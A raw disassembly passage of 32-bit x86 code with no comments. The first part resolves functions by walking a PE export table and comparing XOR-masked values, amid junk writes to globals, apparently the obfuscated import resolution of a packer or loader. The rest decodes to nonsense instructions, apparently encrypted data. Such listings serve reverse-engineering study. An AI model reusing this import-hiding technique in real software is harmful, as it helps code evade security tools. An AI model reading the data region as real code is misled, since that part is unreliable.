  406148:	xor    eax,eax
  40614a:	xor    eax,DWORD PTR ds:0x42a01c
  406150:	xor    DWORD PTR ds:0x428018,eax
  406156:	mov    eax,DWORD PTR [ebp-0x4]
  406159:	mov    ecx,DWORD PTR [ebp-0x18]
  40615c:	xor    eax,ebx
  40615e:	add    eax,edi
  406160:	cmp    ecx,eax
  406162:	je     0x406313
  406168:	mov    ecx,DWORD PTR ds:0x429010
  40616e:	add    DWORD PTR ds:0x42a010,ecx
  406174:	mov    eax,DWORD PTR [ebp-0x18]
  406177:	and    DWORD PTR ds:0x42a008,0x0
  406181:	jmp    0x406193
  406186:	mov    ecx,DWORD PTR ds:0x42a008
  40618c:	inc    ecx
  40618d:	mov    DWORD PTR ds:0x42a008,ecx
  406193:	cmp    DWORD PTR ds:0x42a008,0x14
  40619a:	jae    0x40621e
  4061a0:	cmp    DWORD PTR ds:0x42a008,0x1f
  4061a7:	jne    0x4061d5
  4061ad:	push   0x42b010
  4061b2:	push   DWORD PTR [ebp-0x10]
  4061b5:	push   0x4f72
  4061ba:	push   0x42900c
  4061bf:	push   DWORD PTR [ebp-0x24]
  4061c2:	push   0x423982
  4061c7:	push   DWORD PTR [ebp-0x1c]
  4061ca:	push   0x3544
  4061cf:	call   DWORD PTR ds:0x424024
  4061d5:	jmp    0x406186
  4061da:	and    DWORD PTR ds:0x428020,0x0
  4061e4:	mov    ecx,DWORD PTR ds:0x428020
  4061ea:	inc    ecx
  4061eb:	mov    DWORD PTR ds:0x428020,ecx
  4061f1:	cmp    DWORD PTR ds:0x428020,0x1a
  4061f8:	jne    0x406211
  4061fe:	push   DWORD PTR [ebp-0x1c]
  406201:	push   0x561b
  406206:	push   0x3276
  40620b:	call   DWORD PTR ds:0x424028
  406211:	cmp    DWORD PTR ds:0x428020,0x17
  406218:	jb     0x4061e4
  40621e:	mov    eax,DWORD PTR [eax+0x18]
  406221:	mov    DWORD PTR [ebp-0x24],eax
  406224:	xor    eax,eax
  406226:	mov    eax,DWORD PTR [ebp-0x18]
  406229:	mov    ecx,DWORD PTR [ebp+0x8]
  40622c:	add    DWORD PTR ds:0x42901c,0x480
  406236:	add    ecx,DWORD PTR [eax+0x20]
  406239:	mov    DWORD PTR [ebp-0x2c],ecx
  40623c:	sub    DWORD PTR ds:0x42c00c,ebx
  406242:	mov    eax,DWORD PTR [ebp-0x18]
  406245:	mov    ecx,DWORD PTR [ebp+0x8]
  406248:	add    DWORD PTR ds:0x42a004,0x42a01c
  406252:	add    ecx,DWORD PTR [eax+0x24]
  406255:	mov    DWORD PTR [ebp-0x34],ecx
  406258:	inc    ecx
  406259:	mov    eax,DWORD PTR [ebp-0x18]
  40625c:	sub    DWORD PTR ds:0x42b010,0x20b8
  406266:	mov    ecx,DWORD PTR [ebp+0x8]
  406269:	or     DWORD PTR ds:0x42a010,0x1874
  406273:	add    ecx,DWORD PTR [eax+0x1c]
  406276:	mov    eax,edi
  406278:	mov    DWORD PTR [ebp-0x18],ecx
  40627b:	jmp    0x4062db
  406280:	mov    ecx,DWORD PTR [ebp-0x2c]
  406283:	mov    edx,DWORD PTR [ebp+0x8]
  406286:	add    edx,DWORD PTR [ecx+esi*4]
  406289:	mov    DWORD PTR [ebp-0x28],edx
  40628c:	mov    ecx,DWORD PTR [ebp-0x4]
  40628f:	mov    edx,DWORD PTR [ebp-0x28]
  406292:	xor    ecx,ebx
  406294:	add    ecx,eax
  406296:	cmp    edx,ecx
  406298:	je     0x4062db
  40629e:	jmp    0x4062c7
  4062a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4062a6:	mov    edx,DWORD PTR [ebp-0x8]
  4062a9:	xor    ecx,ebx
  4062ab:	add    ecx,eax
  4062ad:	cmp    edx,ecx
  4062af:	je     0x40631f
  4062b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4062b8:	mov    edx,DWORD PTR [ebp-0x30]
  4062bb:	xor    ecx,ebx
  4062bd:	add    ecx,eax
  4062bf:	cmp    edx,ecx
  4062c1:	je     0x40632e
  4062c7:	lea    eax,[ebp-0x8]
  4062ca:	push   eax
  4062cb:	push   DWORD PTR [ebp-0x28]
  4062ce:	push   DWORD PTR [ebp+0xc]
  4062d1:	call   0x41c3b5
  4062d6:	mov    eax,0x3272db
  4062db:	mov    ecx,DWORD PTR [ebp-0x4]
  4062de:	mov    edx,DWORD PTR [ebp-0x8]
  4062e1:	xor    ecx,ebx
  4062e3:	add    ecx,eax
  4062e5:	cmp    edx,ecx
  4062e7:	je     0x406302
  4062ed:	mov    ecx,DWORD PTR [ebp-0x34]
  4062f0:	movzx  ecx,WORD PTR [ecx+esi*2]
  4062f4:	mov    edx,DWORD PTR [ebp-0x18]
  4062f7:	mov    ecx,DWORD PTR [edx+ecx*4]
  4062fa:	mov    DWORD PTR [ebp-0x38],ecx
  4062fd:	jmp    0x4062a3
  406302:	mov    ecx,DWORD PTR [ebp-0x14]
  406305:	xor    ecx,ebx
  406307:	lea    esi,[esi+ecx*1+0x3272db]
  40630e:	jmp    0x405fec
  406313:	mov    eax,DWORD PTR [ebp-0x4]
  406316:	xor    eax,ebx
  406318:	add    eax,edi
  40631a:	jmp    0x40cf3f
  40631f:	mov    eax,DWORD PTR [ebp-0x4]
  406322:	xor    eax,ebx
  406324:	add    eax,0x3272db
  406329:	jmp    0x40cf3f
  40632e:	mov    ecx,DWORD PTR [ebp-0x38]
  406331:	add    ecx,DWORD PTR [ebp+0x8]
  406334:	mov    DWORD PTR [ebp-0x10],ecx
  406337:	mov    ecx,DWORD PTR [ebp-0x1c]
  40633a:	test   ecx,ecx
  40633c:	je     0x40ceca
  406342:	mov    DWORD PTR [ebp-0x20],0x0
  406349:	jmp    0x4086d8
  40634e:	ins    BYTE PTR es:[edi],dx
  40634f:	pop    ebp
  406350:	(bad)  
  406351:	call   0xd5a4cae1
  406356:	xchg   esi,eax
  406357:	imul   esi,edx,0x66
  40635a:	out    0xea,al
  40635c:	cld    
  40635d:	jno    0x406397
  40635f:	cmp    esp,DWORD PTR [edx+0x62]
  406362:	adc    BYTE PTR [edi+0x62],bl
  406365:	bound  esi,QWORD PTR [ebx-0x29533d8e]
  40636b:	cmp    dh,BYTE PTR [ebp+0x1f65b548]
  406371:	sbb    eax,0x18bfbc86
  406376:	(bad)  
  406377:	popf   
  406378:	sbb    eax,0x25ddfcd8
  40637d:	and    BYTE PTR [edi+0x4a],dl
  406380:	lock inc ecx
  406382:	mov    al,ds:0x1fad8bfe
  406387:	mov    edx,0x9ecd1bec
  40638c:	cdq    
  40638d:	dec    esp
  40638e:	popa   
  40638f:	cli    
  406390:	mov    ch,0xf8
  406392:	jno    0x4063b2
  406394:	inc    edx
  406395:	jmp    0x497:0x9a33a540
  40639c:	fwait
  40639d:	dec    edx
  40639e:	scas   eax,DWORD PTR es:[edi]
  40639f:	or     DWORD PTR [ecx-0x2a],0xcf2403a7
  4063a6:	stos   BYTE PTR es:[edi],al
  4063a7:	in     al,0xba
  4063a9:	nop
  4063aa:	mov    bh,0xbb
  4063ac:	into   
  4063ad:	cdq    
  4063ae:	xchg   esi,eax
  4063af:	mov    bh,0x5
  4063b1:	or     esi,esi
  4063b3:	shl    BYTE PTR [ecx+0x66],cl
  4063b6:	pop    ebp
  4063b7:	loopne 0x406408
  4063b9:	lds    ecx,FWORD PTR [eax+0x4b]
  4063bc:	or     BYTE PTR [ecx+0xc5cb5c7],al
  4063c2:	jmp    0x9b53:0xa9796000
  4063c9:	adc    eax,DWORD PTR [edx+eax*1+0x53]
  4063cd:	fsubr  st,st(3)
  4063cf:	adc    al,0x73
  4063d1:	sti    
  4063d2:	in     al,0x7f
  4063d4:	(bad)  
  4063d5:	sahf   
  4063d6:	jae    0x406397
  4063d8:	scas   eax,DWORD PTR es:[edi]
  4063d9:	sub    eax,0x52a53ef0
  4063de:	jl     0x406387
  4063e0:	mov    bh,0x7f
  4063e2:	outs   dx,BYTE PTR ds:[esi]
  4063e3:	(bad)  
  4063e4:	loop   0x40640b
  4063e6:	iret   
  4063e7:	(bad)  ds:0x788c5def
  4063ed:	mov    ebp,0xd9b3c22
  4063f2:	or     al,0x29
  4063f4:	pop    es
  4063f5:	cwde   
  4063f6:	jae    0x40643b
  4063f8:	das    
  4063f9:	adc    DWORD PTR [eax+0x3f7b2cb8],eax
  4063ff:	sbb    DWORD PTR [edi],ebx
  406401:	inc    eax
  406402:	add    ah,BYTE PTR [edx+ecx*4+0x71]
  406406:	je     0x4063c8
  406408:	add    eax,0x7face1f7
  40640d:	jne    0x406414
  40640f:	push   edi
  406410:	mov    al,0x1d
  406412:	cs push ds
  406414:	pop    ecx
  406415:	(bad)  
  406417:	cld    
  406418:	fwait
  406419:	scas   al,BYTE PTR es:[edi]
  40641a:	out    0xbf,al
  40641c:	mov    al,0xc0
  40641e:	adc    BYTE PTR [edi-0xc],ah
  406421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406422:	arpl   WORD PTR ds:0x902edabf,dx
  406428:	daa    
  406429:	mov    ds,WORD PTR fs:[ebx-0x43]
  40642d:	pop    es
  40642e:	rcr    BYTE PTR [edx+0x1552013e],0xd6
  406435:	outs   dx,DWORD PTR ds:[esi]
  406436:	lea    ebp,[ecx+0x31]
  406439:	je     0x4064b1
  40643b:	ins    DWORD PTR es:[edi],dx
  40643c:	fs adc ah,ah
  40643f:	fbstp  TBYTE PTR [esi+0xc06ef6b]
  406445:	enter  0xa2d0,0x73
  406449:	mov    ah,0x75
  40644b:	(bad)  
  40644c:	idiv   BYTE PTR fs:[ebx]
  40644f:	pusha  
  406450:	push   edx
  406451:	jp     0x4064c3
  406453:	ja     0x4063ef
  406455:	cmp    BYTE PTR [eax-0x67],dl
  406458:	mov    ah,0x77
  40645a:	inc    ecx
  40645b:	into   
  40645c:	sub    bl,BYTE PTR [ecx-0x704de17b]
  406462:	out    0xea,al
  406464:	push   ecx
  406465:	push   es
  406466:	rcl    ecx,1
  406468:	(bad)  [ecx-0x113252f3]
  40646e:	mov    al,ds:0x6404c009
  406473:	outs   dx,BYTE PTR ds:[esi]
  406474:	xor    DWORD PTR [esi+0x6c],edx
  406477:	(bad)  
  406478:	inc    ebp
  406479:	leave  
  40647a:	and    bl,bl
  40647c:	sbb    DWORD PTR [esi+0x6a],ebx
  40647f:	mov    eax,ds:0x2a08f22b
  406484:	aam    0x1b
  406486:	fidivr DWORD PTR [edx+0x2237aae8]
  40648c:	call   0x456aa710
  406491:	push   edx
  406492:	mul    BYTE PTR ds:0xa99b0dd
  406498:	stc    
  406499:	mov    DWORD PTR [ebp-0x78ce5fad],esi
  40649f:	pushf  
  4064a0:	push   ecx
  4064a1:	dec    ebp
  4064a2:	push   ebp
  4064a3:	test   eax,0xacb46b69
  4064a8:	test   DWORD PTR [ebx+0x21],ebx
  4064ab:	pop    ds
  4064ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064ad:	jl     0x406491
  4064af:	mov    ah,0x8a
  4064b1:	mov    dh,0x52
  4064b3:	push   edx
  4064b5:	or     edx,DWORD PTR [edx]
  4064b7:	mov    eax,0xf249bbab
  4064bc:	in     al,0x40
  4064be:	aam    0xdb
  4064c0:	repnz aas 
  4064c2:	push   ds
  4064c3:	sti    
  4064c4:	js     0x406449
  4064c6:	dec    eax
  4064c7:	pop    esi
  4064c8:	jle    0x4064d8
  4064ca:	mov    ah,0x30
  4064cc:	mov    dh,0x84
  4064ce:	dec    esi
  4064cf:	dec    BYTE PTR [edi-0x69]
  4064d2:	js     0x4064b2
  4064d4:	mov    al,ds:0x70c8ab3e
  4064d9:	scas   al,BYTE PTR es:[edi]
  4064da:	addr16 push eax
  4064dc:	lods   al,BYTE PTR ds:[esi]
  4064dd:	cli    
  4064de:	push   ebp
  4064df:	fistp  QWORD PTR [edi+0x12c78272]
  4064e5:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064e7:	push   esi
  4064e8:	out    dx,eax
  4064e9:	xor    eax,0x989b9e0c
  4064ee:	jbe    0x406513
  4064f0:	ins    BYTE PTR es:[edi],dx
  4064f1:	sub    bl,BYTE PTR [eax]
  4064f3:	fadd   QWORD PTR [esp+eax*2]
  4064f6:	stos   BYTE PTR es:[edi],al
  4064f7:	push   ebx
  4064f8:	mov    esp,0xd68d5fd9
  4064fd:	jmp    0x4064ca
  4064ff:	or     DWORD PTR [edi-0x30b8a55b],ebp
  406505:	int    0x6a
  406507:	sub    dh,BYTE PTR [edx+eiz*8]
  40650a:	jmp    0x406523
  40650c:	aaa    
  40650d:	mov    dh,dh
  40650f:	aaa    
  406510:	retf   
  406511:	je     0x4064e5
  406513:	mov    ds:0x70569b51,al
  406518:	aaa    
  406519:	jg     0x4064c9
  40651b:	(bad)  
  40651c:	popf   
  40651d:	jno    0x40658f
  40651f:	imul   edx,DWORD PTR [edi],0xcb3b8375
  406525:	test   al,0x6a
  406527:	or     eax,0xa0589c27
  40652c:	not    DWORD PTR [edi+0x5e]
  40652f:	sbb    al,0x94
  406531:	icebp  
  406532:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406533:	aad    0xf2
  406535:	out    dx,eax
  406536:	int    0xdd
  406538:	jg     0x4064fd
  40653a:	mov    ebx,0x6bece51c
  40653f:	sbb    eax,0x9884d3b4
  406544:	retf   0x7b84
  406547:	dec    edx
  406548:	jl     0x406535
  40654a:	inc    edx
  40654b:	pusha  
  40654c:	nop
  40654d:	int    0x67
  40654f:	dec    esi
  406550:	sbb    al,0xd1
  406552:	cmp    eax,0xf997b06f
  406557:	lahf   
  406558:	cwde   
  406559:	pop    ds
  40655a:	in     eax,dx
  40655b:	popa   
  40655c:	fisub  DWORD PTR [edi]
  40655e:	aad    0xfb
  406560:	inc    ebx
  406561:	adc    ecx,0x1a5a37df
  406567:	popf   
  406568:	lds    ebx,FWORD PTR [eax]
  40656a:	add    al,0x64
  40656c:	xchg   esi,eax
  40656d:	in     al,0xb2
  40656f:	shr    DWORD PTR fs:[edi+0x4f],cl
  406573:	loopne 0x406540
  406575:	mov    ds:0x5f2b2496,al
  40657a:	jno    0x4065d7
  40657c:	cwde   
  40657d:	push   ebp
  40657e:	jne    0x406596
  406580:	xchg   ecx,eax
  406581:	push   edi
  406582:	lods   al,BYTE PTR ds:[esi]
  406583:	mov    ds,WORD PTR [edi-0x6e2037d1]
  406589:	clc    
  40658a:	jne    0x4065a6
  40658c:	adc    ah,BYTE PTR [esi+0x4e]
  40658f:	push   esi
  406590:	inc    esi
  406591:	fstp   QWORD PTR ds:0x2eb25308
  406597:	jbe    0x406559
  406599:	xor    al,0xa
  40659b:	loop   0x4065c3
  40659d:	sub    ebp,DWORD PTR [edi+0x0]
  4065a0:	sbb    bh,dl
  4065a2:	jmp    0xa1e:0xd40f69ac
  4065a9:	sub    eax,0x1f6e242a
  4065ae:	cmp    eax,0xeee5331d
  4065b3:	js     0x4065bc
  4065b5:	ror    dl,0x33
  4065b8:	xor    eax,0xd9941b14
  4065bd:	sub    eax,0x7175450f
  4065c2:	and    al,0x5b
  4065c4:	sbb    ch,bl
  4065c6:	fs push ebx
  4065c8:	rcl    BYTE PTR [esi+0x73],cl
  4065cb:	(bad)  
  4065cc:	stc    
  4065cd:	in     al,0x27
  4065cf:	stos   BYTE PTR es:[edi],al
  4065d0:	je     0x406576
  4065d2:	dec    edi
  4065d3:	ds stos BYTE PTR es:[edi],al
  4065d5:	inc    ebp
  4065d6:	or     DWORD PTR [edi-0x7c],edx
  4065d9:	(bad)  
  4065da:	les    edi,FWORD PTR [edx-0x7a]
  4065dd:	and    BYTE PTR [esi],cl
  4065df:	in     eax,dx
  4065e0:	cs mov al,0xe1
  4065e3:	fs rcr bh,1
  4065e6:	iret   
  4065e7:	mov    ds:0xf07f22e7,eax
  4065ec:	pop    edx
  4065ed:	fistp  DWORD PTR [edi-0x7a]
  4065f0:	ret    
  4065f1:	adc    eax,0x858ea5dd
  4065f6:	pop    ss
  4065f7:	dec    ebx
  4065f8:	mov    al,0x84
  4065fa:	mov    ds:0x73a96637,al
  4065ff:	xchg   ebx,eax
  406600:	dec    edi
  406601:	test   BYTE PTR [ebp+0x14073fce],0x37
  406608:	mov    eax,0xb72643d9
  40660d:	sub    BYTE PTR [esi],ch
  40660f:	lock movd esi,mm6
  406613:	adc    eax,DWORD PTR [edi+esi*4-0x22d6a366]
  40661a:	outs   dx,DWORD PTR ds:[esi]
  40661b:	xchg   esi,eax
  40661c:	jle    0x40669a
  40661e:	or     BYTE PTR [ebp-0x7a5fbc26],bl
  406624:	and    eax,0x6a82d8f4
  406629:	or     al,0xf6
  40662b:	dec    ecx
  40662c:	cmp    sp,cx
  40662f:	cmp    dl,BYTE PTR [edx]
  406631:	in     al,0x26
  406633:	repnz push es
  406635:	nop
  406636:	dec    esi
  406637:	jmp    0x4066a7
  406639:	ret    
  40663a:	pop    es
  40663b:	stos   DWORD PTR es:[edi],eax
  40663c:	outs   dx,BYTE PTR ds:[esi]
  40663d:	retf   
  40663e:	xor    esp,DWORD PTR [ecx-0x6]
  406641:	clc    
  406642:	cmp    DWORD PTR [ebp+0x50a05d7e],ebx
  406648:	ret    
  406649:	xor    DWORD PTR [eax+0x4f],ebp
  40664c:	and    bl,al
  40664e:	jmp    0x4066a8
  406650:	loope  0x4065f3
  406652:	and    eax,DWORD PTR [eax-0x80c159d]
  406658:	and    ecx,DWORD PTR [ebx]
  40665a:	push   ds
  40665b:	push   eax
  40665c:	jle    0x4066bf
  40665e:	out    dx,eax
  40665f:	mov    dh,0xf1
  406661:	adc    dh,ah
  406663:	adc    al,0xcd
  406665:	repnz out dx,eax
  406667:	add    DWORD PTR ds:0xf7702a1b,edi
  40666d:	cmc    
  40666e:	dec    edi
  40666f:	pop    ecx
  406670:	gs jne 0x40667a
  406673:	loope  0x4066af
  406675:	in     eax,dx
  406676:	xchg   ebp,eax
  406677:	xor    BYTE PTR ds:0x16845d25,ch
  40667d:	inc    ebp
  40667e:	inc    ebp
  40667f:	dec    edi
  406680:	es push ebx
  406682:	ja     0x4066b2
  406684:	adc    BYTE PTR [eax-0x5ba75a77],0xe2
  40668b:	lea    eax,[edi+0x38deceff]
  406691:	idiv   BYTE PTR [ecx+0xd]
  406694:	sahf   
  406695:	adc    BYTE PTR [ecx+0x12],al
  406698:	les    esp,FWORD PTR [ebx-0x39130992]
  40669e:	dec    ebp
  40669f:	hlt    
  4066a0:	xor    dl,BYTE PTR [ebp+0x62]
  4066a3:	and    BYTE PTR [ecx-0x5ec4674],al
  4066a9:	cmp    dh,BYTE PTR [ebx-0x780d22c9]
  4066af:	pop    ss
  4066b0:	and    cl,BYTE PTR [ebx+0x19]
  4066b3:	sbb    al,0x1c
  4066b5:	mov    ch,BYTE PTR [edi-0x75]
  4066b8:	cmp    edx,DWORD PTR [ecx+ecx*2]
  4066bb:	imul   edi,DWORD PTR [edi+eax*2+0x2c5d0853],0x41670ed9
  4066c6:	ficomp DWORD PTR [ebx+0x6d88746e]
  4066cc:	arpl   di,ax
  4066ce:	arpl   WORD PTR [eax+ebp*1-0x6d],sp
  4066d2:	fs aas 
  4066d4:	addr16 fdivr st,st(5)
  4066d7:	mov    bh,0x43
  4066d9:	inc    esp
  4066da:	xor    cl,BYTE PTR [eax]
  4066dc:	cmp    al,BYTE PTR [ecx+0x2ce070c2]
  4066e2:	daa    
  4066e3:	dec    esp
  4066e4:	int3   
  4066e5:	xchg   edx,ebp
  4066e7:	cmp    al,ah
  4066e9:	(bad)  
  4066ea:	lods   al,BYTE PTR ds:[esi]
  4066eb:	les    ebp,FWORD PTR [eax]
  4066ed:	jnp    0x40671f
  4066ef:	daa    
  4066f0:	ret    0x6ff1
  4066f3:	lds    edx,FWORD PTR ds:0x8113c8ec
  4066f9:	push   eax
  4066fa:	mov    ebp,0xf2846c60
  4066ff:	pop    esi
  406700:	pop    esi
  406701:	sub    eax,0x62d18226
  406706:	call   0x43510480
  40670b:	jge    0x406740
  40670d:	(bad)  
  40670f:	addr16 adc esp,esi
  406712:	dec    ebp
  406713:	pop    es
  406714:	sub    al,0xcf
  406716:	fsub   QWORD PTR ds:0x43890174
  40671c:	jbe    0x406773
  40671e:	cdq    
  40671f:	cmp    bh,BYTE PTR [edi]
  406721:	(bad)  
  406722:	call   0x654e8938
  406727:	loop   0x406701
  406729:	mov    esi,0x99fe96f8
  40672e:	pop    esi
  40672f:	fstp   QWORD PTR [ecx-0x6f55e0b5]
  406735:	(bad)  [ebx]
  406737:	jne    0x40679e
  406739:	shl    DWORD PTR [ebp+0x19],0xc2
  40673d:	cmp    eax,0x189b6ae4
  406742:	in     al,dx
  406743:	hlt    
  406744:	outs   dx,DWORD PTR ds:[esi]
  406745:	push   edx
  406746:	(bad)  
  406747:	(bad)  
  406748:	stc    
  406749:	iret   
  40674a:	jge    0x40678e
  40674c:	stos   WORD PTR es:[edi],ax
  40674e:	or     eax,0x1b58096
  406753:	add    BYTE PTR [ebx],ah
  406755:	jo     0x406708
  406757:	inc    ebx
  406758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406759:	push   0xffffffeb
  40675b:	inc    esp
  40675c:	mov    eax,0xe2ce6b82
  406761:	jl     0x4066ed
  406763:	(bad)  
  406764:	mov    edx,DWORD PTR [ecx]
  406766:	or     eax,0x88f93bbe
  40676b:	pop    ebp
  40676c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40676d:	pop    edx
  40676e:	clc    
  40676f:	aad    0x8b
  406771:	add    BYTE PTR [eax-0x2955d74b],dh
  406777:	popf   
  406778:	(bad)  
  406779:	sub    DWORD PTR [edx],esp
  40677b:	dec    edi
  40677c:	sbb    esi,DWORD PTR [esi+ebp*2+0x9257baf]
  406783:	out    dx,eax
  406784:	ss push ecx
  406786:	cmp    BYTE PTR [edi+ebp*4],bl
  406789:	ret    0x593d
  40678c:	mov    ch,0x18
  40678e:	cmp    DWORD PTR [esi],eax
  406790:	cdq    
  406791:	cdq    
  406792:	add    al,0x47
  406794:	lock mov esp,0x24d1173b
  40679a:	sahf   
  40679b:	aam    0xa7
  40679d:	in     eax,0xb4
  40679f:	adc    ah,BYTE PTR [edi]
  4067a1:	iret   
  4067a2:	inc    ebp
  4067a3:	inc    ecx
  4067a4:	jno    0x406804
  4067a6:	inc    edx
  4067a7:	xor    dh,BYTE PTR [ebp-0x32]
  4067aa:	or     BYTE PTR [ebp+0x589b74d6],ah
  4067b0:	mov    dl,0x56
  4067b2:	(bad)  
  4067b3:	jae    0x4067f4
  4067b5:	push   eax
  4067b6:	mov    edx,0xddd6c61f
  4067bb:	cwde   
  4067bc:	ins    DWORD PTR es:[edi],dx
  4067bd:	cmp    al,0xd7
  4067c0:	inc    ebp
  4067c1:	lods   al,BYTE PTR ds:[esi]
  4067c2:	scas   eax,DWORD PTR es:[edi]
  4067c3:	xor    al,0xad
  4067c5:	es jne 0x4067f5
  4067c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067c9:	dec    ebx
  4067ca:	cmp    al,0xdb
  4067cc:	stos   DWORD PTR es:[edi],eax
  4067cd:	xchg   esi,edx
  4067cf:	repz (bad) 
  4067d1:	xor    al,0xc4
  4067d3:	xor    eax,0x80c5c5e3
  4067d8:	sub    esp,DWORD PTR [eax]
  4067da:	cs int 0xb8
  4067dd:	cmp    eax,0x11d79e09
  4067e2:	mov    edi,0x723114ec
  4067e7:	push   ebx
  4067e8:	mov    ah,0xf2
  4067ea:	(bad)  
  4067eb:	mov    cl,BYTE PTR [esi-0x75]
  4067ee:	fwait
  4067ef:	into   
  4067f0:	out    dx,eax
  4067f1:	mov    bh,0x13
  4067f3:	fistp  DWORD PTR [edi-0x3b]
  4067f6:	push   es
  4067f7:	push   es
  4067f8:	ficomp DWORD PTR [ebp-0x21]
  4067fb:	or     ebx,DWORD PTR [edx]
  4067fd:	and    DWORD PTR [esi+0x261d707b],edi
  406803:	inc    edx
  406804:	dec    ecx
  406805:	pop    ss
  406806:	pop    esp
  406807:	arpl   cx,cx
  406809:	xchg   edx,eax
  40680a:	push   ds
  40680b:	mov    ebp,0xee6fdb1f
  406810:	jae    0x406839
  406812:	pop    es
  406813:	push   edi
  406814:	lock cli 
  406816:	push   cs
  406817:	sub    dl,bh
  406819:	inc    esi
  40681a:	pop    ss
  40681b:	sbb    esi,DWORD PTR [eax+0x75f060ee]
  406821:	dec    esp
  406822:	mov    ds:0x67a92306,eax
  406827:	pop    es
  406828:	scas   al,BYTE PTR es:[edi]
  406829:	cmp    DWORD PTR [ebp+0x1c056dd5],0xfffffff7
  406830:	js     0x4067fd
  406832:	mov    DWORD PTR [edx-0x604419d4],edi
  406838:	ins    BYTE PTR es:[edi],dx
  406839:	add    DWORD PTR [ebx],esp
  40683b:	xor    BYTE PTR [edx+0x6f],ah
  40683e:	dec    ecx
  40683f:	mov    WORD PTR [esi+0x5c6e670],ss
  406845:	sbb    eax,0x3aff1a55
  40684a:	push   edx
  40684b:	ret    0xae1c
  40684e:	fisub  WORD PTR [ebp-0x7]
  406851:	fst    st(2)
  406853:	(bad)  
  406854:	into   
  406855:	mov    al,ds:0x87eafd56
  40685a:	clc    
  40685b:	push   es
  40685c:	pop    ecx
  40685d:	call   DWORD PTR [ebx+0x16]
  406860:	js     0x40684f
  406862:	test   DWORD PTR [edi],0x462f62ac
  406868:	or     DWORD PTR [esi],esi
  40686a:	fxch   st(7)
  40686c:	shl    DWORD PTR [esi-0x59],0x96
  406870:	or     BYTE PTR [edi-0x60],cl
  406873:	mov    al,0xb3
  406875:	push   0x4e4599bf
  40687a:	sub    esi,DWORD PTR [eax+0x6c]
  40687d:	jno    0x40687e
  40687f:	mov    bh,0xf
  406881:	cwde   
  406882:	sub    DWORD PTR [edi+0x4dc8f073],esi
  406888:	or     cl,BYTE PTR [edx-0x7a9c0787]
  40688e:	dec    edx
  40688f:	es out dx,eax
  406891:	in     eax,dx
  406892:	arpl   si,sp
  406894:	inc    edx
  406895:	repz popf 
  406897:	mov    ch,0x25
  406899:	push   edi
  40689a:	inc    esi
  40689b:	push   ds
  40689c:	pop    ds
  40689d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40689e:	fadd   DWORD PTR [edi]
  4068a0:	mov    ebx,0x48247d86
  4068a5:	pop    ss
  4068a6:	xchg   edi,eax
  4068a7:	dec    edx
  4068a8:	and    BYTE PTR [eax+0xcc258ab],bh
  4068ae:	and    BYTE PTR ds:0x1f851e9a,ah
  4068b4:	mov    BYTE PTR fs:[edi-0x6e],dh
  4068b8:	in     al,dx
  4068b9:	rcl    eax,1
  4068bb:	inc    esp
  4068bc:	ret    0x9ee6
  4068bf:	stc    
  4068c0:	gs and al,0x34
  4068c3:	xor    esi,esp
  4068c5:	mul    BYTE PTR [eax-0x3]
  4068c8:	ja     0x40690c
  4068ca:	out    dx,al
  4068cb:	mov    edx,0x35904a84
  4068d0:	mov    eax,ds:0x5685b941
  4068d5:	and    BYTE PTR [eax-0x759976f1],cl
  4068db:	dec    esi
  4068dc:	popa   
  4068dd:	dec    ecx
  4068de:	sub    eax,0x28e8eed
  4068e3:	mov    al,ds:0xd3035272
  4068e8:	iret   
  4068e9:	and    eax,0xbfea5858
  4068ee:	and    DWORD PTR [esi+eax*8],edx
  4068f1:	fimul  WORD PTR [ebp-0x1c]
  4068f4:	push   ds
  4068f5:	outs   dx,DWORD PTR ds:[esi]
  4068f6:	int3   
  4068f7:	dec    ebp
  4068f8:	scas   al,BYTE PTR es:[edi]
  4068f9:	and    esi,DWORD PTR ds:[ebx-0x55713665]
  406900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406901:	mov    ch,0xf9
  406903:	mov    BYTE PTR [eax+0x517882c4],0x12
  40690a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40690b:	add    DWORD PTR [ecx+0x51608ba8],ebx
  406911:	sub    al,0xfc
  406913:	addr16 dec ebp
  406915:	sar    ch,0xd3
  406918:	cwde   
  406919:	mov    ebp,0x84bd2dfc
  40691e:	popf   
  40691f:	sbb    al,0xe3
  406921:	xchg   edi,eax
  406922:	stos   DWORD PTR es:[edi],eax
  406923:	sub    eax,0xfaae6987
  406928:	mov    eax,0x1a62f7fe
  40692d:	add    DWORD PTR [ebx+0x2676c19f],esp
  406933:	dec    edx
  406934:	dec    ecx
  406935:	arpl   WORD PTR [edx],sp
  406937:	inc    eax
  406938:	or     ch,bl
  40693a:	cmc    
  40693b:	std    
  40693c:	bound  esp,QWORD PTR [esi-0x38]
  40693f:	add    al,BYTE PTR [edx+0x4c32a94c]
  406945:	nop
  406946:	scas   al,BYTE PTR es:[edi]
  406947:	xor    DWORD PTR [edi-0x1842e3ca],ebp
  40694d:	jge    0x40695c
  40694f:	test   BYTE PTR [eax-0x5f],ah
  406952:	inc    ebx
  406953:	jae    0x40694e
  406955:	ret    
  406956:	mov    esi,edi
  406958:	pop    eax
  406959:	sub    al,0x40
  40695b:	add    esi,DWORD PTR [esi+0x1a7d111]
  406961:	repz mov al,ds:0xdd5bccd7
  406967:	pop    esi
  406968:	sub    BYTE PTR [esi-0x5f],dl
  40696b:	mov    dl,0x79
  40696d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40696e:	inc    esp
  40696f:	pop    esp
  406970:	inc    edx
  406971:	pop    eax
  406972:	sbb    BYTE PTR [edx+0xd],0xa5
  406976:	and    al,BYTE PTR [edi+0x39dd19f3]
  40697c:	icebp  
  40697d:	push   0x34e397f2
  406982:	in     eax,0x10
  406984:	jmp    0xdd8b263b
  406989:	call   0x3ad6a189
  40698e:	mov    dl,0xcf
  406990:	inc    ebx
  406991:	or     dh,ch
  406993:	push   es
  406994:	mov    WORD PTR [esi],fs
  406996:	pop    esi
